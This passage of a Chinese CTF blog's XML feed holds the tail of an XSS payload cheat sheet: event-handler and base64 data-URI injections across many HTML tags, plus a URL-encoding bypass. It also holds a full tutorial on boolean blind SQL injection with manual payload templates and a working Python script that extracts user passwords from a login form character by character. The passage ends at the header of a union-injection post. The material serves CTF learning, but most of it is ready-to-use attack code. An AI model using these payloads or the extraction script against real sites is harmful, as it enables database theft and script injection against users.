onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>src</code>属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; </span><br><span class="line">//base64解码后为&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-3"><a href="#标签-3" class="headerlink" title="&lt;audio&gt; 标签"></a><code>&lt;audio&gt;</code> 标签</h3><p><code>&lt;audio&gt;</code> 标签定义声音，比如音乐或其他音频流。</p><p><strong>对应属性：</strong></p><p><code>onerror</code>（加载错误时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-4"><a href="#标签-4" class="headerlink" title="&lt;video&gt;标签"></a><code>&lt;video&gt;</code>标签</h3><p><strong>对应属性：</strong></p><p><code>onerror</code>（加载错误时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><p><code>onclick</code>（点击时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-5"><a href="#标签-5" class="headerlink" title="&lt;svg&gt; 标签"></a><code>&lt;svg&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onload</code>（加载完成时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-6"><a href="#标签-6" class="headerlink" title="&lt;button&gt; 标签"></a><code>&lt;button&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onclick</code>（点击时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=alert(1)&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseout</code>（鼠标移出时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseup</code>（鼠标按钮释放时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><code>onmousedown</code>（鼠标按钮按下时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-7"><a href="#标签-7" class="headerlink" title="&lt;div&gt;标签"></a><code>&lt;div&gt;</code>标签</h3><p><strong>对应属性：</strong></p><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><p>这个需要借助url编码来实现绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原代码：</span><br><span class="line">&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;</span><br><span class="line">经过url编码：</span><br><span class="line">&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-8"><a href="#标签-8" class="headerlink" title="&lt;object&gt;标签"></a><code>&lt;object&gt;</code>标签</h3><p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-9"><a href="#标签-9" class="headerlink" title="&lt;script&gt; 标签"></a><code>&lt;script&gt;</code> 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-10"><a href="#标签-10" class="headerlink" title="&lt;p&gt; 标签"></a><code>&lt;p&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onclick</code>（点击时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseout</code>（鼠标移出时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseup</code>（鼠标按钮释放时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-11"><a href="#标签-11" class="headerlink" title="&lt;input&gt; 标签"></a><code>&lt;input&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onclick</code>（点击时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>onkeydown</code>（键盘按键按下时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure><p><code>onkeydown</code>（在键盘按键按下并释放一个键时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-12"><a href="#标签-12" class="headerlink" title="&lt;details&gt;标签"></a><code>&lt;details&gt;</code>标签</h3><p><strong>对应属性：</strong></p><p><code>ontoggle</code>（切换时触发XSS，如:详情元素展开或收起）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-13"><a href="#标签-13" class="headerlink" title="&lt;select&gt; 标签"></a><code>&lt;select&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure><p><code>onclick</code>（点击时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-14"><a href="#标签-14" class="headerlink" title="&lt;form&gt; 标签"></a><code>&lt;form&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseout</code>（鼠标移出时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseup</code>（鼠标按钮释放时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-15"><a href="#标签-15" class="headerlink" title="&lt;body&gt; 标签"></a><code>&lt;body&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onload</code>（加载完成时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><h1 id="文章引用"><a href="#文章引用" class="headerlink" title="文章引用"></a>文章引用</h1><ul><li><p>引用先知博主「Sh4d0w」的文章</p><p>原文链接：<a href="https://xz.aliyun.com/t/12370">https://xz.aliyun.com/t/12370</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS简介：&quot;&gt;&lt;a href=&quot;#XSS简介：&quot; class=&quot;headerlink&quot; title=&quot;XSS简介：&quot;&gt;&lt;/a&gt;XSS简介：&lt;/h1&gt;&lt;p&gt;动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-XSS" scheme="https://we11s.github.io/tags/Web-XSS/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入-布尔盲注</title>
    <link href="https://we11s.github.io/posts/1685515616/"/>
    <id>https://we11s.github.io/posts/1685515616/</id>
    <published>2024-02-07T10:02:34.000Z</published>
    <updated>2024-02-07T14:08:56.800Z</updated>
    
    <content type="html"><![CDATA[<h2 id="布尔盲注介绍"><a href="#布尔盲注介绍" class="headerlink" title="布尔盲注介绍"></a>布尔盲注介绍</h2><p>构造SQL语句，利用and，or等关键字来其后的语句 <code>true</code> 、 <code>false</code>使web页面返回true或者false，从而达到注入的目的来获取信息</p><p><strong>使用条件</strong>：适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false类似的结果（例如：登录成功、）</p><p><strong>注意事项</strong>：</p><ul><li><p>前面参数在数据库<strong>无结果</strong>时，拼接语句使用关键词<code>or</code></p></li><li><p>前面参数在数据库<strong>有结果</strong>时，拼接语句使用关键词<code>and</code></p><p>另建议使用脚本</p></li></ul><h2 id="注入使用函数"><a href="#注入使用函数" class="headerlink" title="注入使用函数"></a>注入使用函数</h2><p><strong>1.</strong><code>substr()/substring()</code>函数</p><p>​<code>substr()/substring()</code>函数：用来截取数据库某个字段中的一部分。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(string，<span class="keyword">start</span>开始位置，length截取长度)  #语法</span><br></pre></td></tr></table></figure><p>参数</p><ul><li>string：必选，数据库中需要截取的字段</li><li>start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。</li><li>length：可选，需要截取的长度。缺省。即截取到结束位置</li></ul><p><strong>2.</strong><code>ascii()</code>函数</p><p>​<code>ascii()</code>函数：返回字符串str的最左边的数值。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(str)  #语法</span><br></pre></td></tr></table></figure><p><strong>3.</strong><code>length()</code> 函数</p><p>​<code>length()</code> 函数，返回字符串的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(str) #语法</span><br></pre></td></tr></table></figure><p><strong>4.</strong><code>left()</code> 函数</p><p>​<code>left()</code> 函数，返回从左至右截取固定长度的字符串</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">left</span>(str,n) #语法 截取字符串str的从左至右前n个字符</span><br></pre></td></tr></table></figure><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><ul><li>求当前数据库长度</li><li>求当前数据库表的ASCII (即爆出数据库名)</li><li>求当前数据库中表的个数</li><li>求当前数据库中其中一个表名的长度</li><li>求当前数据库中其中一个表名的ASCII</li><li>求列名的数量</li><li>求列名的长度</li><li>求列名的ASCII</li><li>求字段的数量</li><li>求字段内容的长度</li><li>求字段内容对应的ASCII</li></ul><h2 id="手工注入过程详解"><a href="#手工注入过程详解" class="headerlink" title="手工注入过程详解"></a>手工注入过程详解</h2><h3 id="基本模板"><a href="#基本模板" class="headerlink" title="基本模板"></a>基本模板</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (长度/字符函数(所爆数据的SQL) = n) --+</span></span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ASCII(SUBSTR((select table_name FROM information_schema.tables where table_schema = database() LIMIT 0,1),1,1)) = 101 #</span></span><br></pre></td></tr></table></figure><p>以爆数据库名字为例</p><h3 id="求长度"><a href="#求长度" class="headerlink" title="求长度"></a>求长度</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (length(database()) = n) --+</span></span><br></pre></td></tr></table></figure><p>通过页面的回显进行判断，数据库的长度是多少</p><h3 id="求数据库名称"><a href="#求数据库名称" class="headerlink" title="求数据库名称"></a>求数据库名称</h3><h3 id="使用left-函数"><a href="#使用left-函数" class="headerlink" title="使用left 函数"></a>使用<code>left</code> 函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 从左至右截取一个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"><span class="comment">-- 从左只有截取两个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">left</span>(database(),<span class="number">2</span>)<span class="operator">=</span><span class="string">&#x27;**&#x27;</span>)</span><br><span class="line"><span class="comment">-- 从左只有截取n个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">left</span>(database(),n)<span class="operator">=</span><span class="string">&#x27;*****&#x27;</span>)</span><br></pre></td></tr></table></figure><p>不断修改<code>*</code>中的字符，使之页面显示为<code>true</code>的类似项（如登录成功、成功等）</p><h3 id="使用SUBSTR函数"><a href="#使用SUBSTR函数" class="headerlink" title="使用SUBSTR函数"></a>使用<code>SUBSTR</code>函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 截取第1个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> (ASCII(SUBSTR(database(),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>)</span><br><span class="line"><span class="comment">-- 截取第2个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> (ASCII(SUBSTR(database(),<span class="number">2</span>,<span class="number">1</span>)) <span class="operator">=</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>)</span><br><span class="line"><span class="comment">-- 截取第n个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> (ASCII(SUBSTR(database(),n,<span class="number">1</span>)) <span class="operator">=</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span>)</span><br></pre></td></tr></table></figure><p>不断修改<code>*</code>中的ASCII码，使之页面显示为<code>true</code>的类似项（如登录成功、成功等）</p><h2 id="注入脚本"><a href="#注入脚本" class="headerlink" title="注入脚本"></a>注入脚本</h2><p><strong>注意查看表单的提交变量名称</strong></p><p>使用POST提交数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&quot;R0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&#123;&#125;&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length</span>(<span class="params">value</span>):  <span class="comment"># 获取要查询的数据的长度</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">&quot;admin&#x27; and length((&#123;0&#125;)) =&#123;1&#125; #&quot;</span>.<span class="built_in">format</span>(data_payload, n)</span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;  //注意查看表单的提交变量名称</span><br><span class="line">        html = requests.post(url, data=data)</span><br><span class="line">        length = <span class="built_in">len</span>(html.text)</span><br><span class="line">        <span class="keyword">if</span> length &lt; value:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;……data length is :&quot;</span> + <span class="built_in">str</span>(n))</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">data_length, value</span>):  <span class="comment"># 获取数据</span></span><br><span class="line">    <span class="keyword">global</span> result</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, data_length):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27;and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;</span>.<span class="built_in">format</span>(data_payload, i, <span class="built_in">ord</span>(char))</span><br><span class="line">            data = &#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;  //注意查看表单的提交变量名称</span><br><span class="line">            html = requests.post(url, data=data)</span><br><span class="line">            length = <span class="built_in">len</span>(html.text)</span><br><span class="line">            <span class="keyword">if</span> length &lt; value:  <span class="comment"># 根据返回长度的不同来判断字符正确与否</span></span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;…… data is :&quot;</span> + result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://***.***.10.67:2081/hard.php&quot;</span></span><br><span class="line">data_payload = <span class="string">&quot;select password from users  limit 0,1&quot;</span> //所爆数据的sql语句</span><br><span class="line">value = <span class="number">550</span>  <span class="comment"># 根据正确访问和错误访问时返回页面文本长度的不同 来设置一个判断值，这个值需要在浏览器中 按f12 查看</span></span><br><span class="line"></span><br><span class="line">length = get_length(value) +<span class="number">1</span></span><br><span class="line">get_data(length, value)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;布尔盲注介绍&quot;&gt;&lt;a href=&quot;#布尔盲注介绍&quot; class=&quot;headerlink&quot; title=&quot;布尔盲注介绍&quot;&gt;&lt;/a&gt;布尔盲注介绍&lt;/h2&gt;&lt;p&gt;构造SQL语句，利用and，or等关键字来其后的语句 &lt;code&gt;true&lt;/code&gt; 、 &lt;code&gt;f</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-SQL" scheme="https://we11s.github.io/tags/Web-SQL/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入-联合查询(union)注入</title>
    <link href="https://we11s.github.io/posts/1145624611/"/>
    <id>https://we11s.github.io/posts/1145624611/</id>
    <published>2024-02-07T10:02:26.000Z</published>
    <updated>2024-02-07T14:06:38.429Z</updated>
    
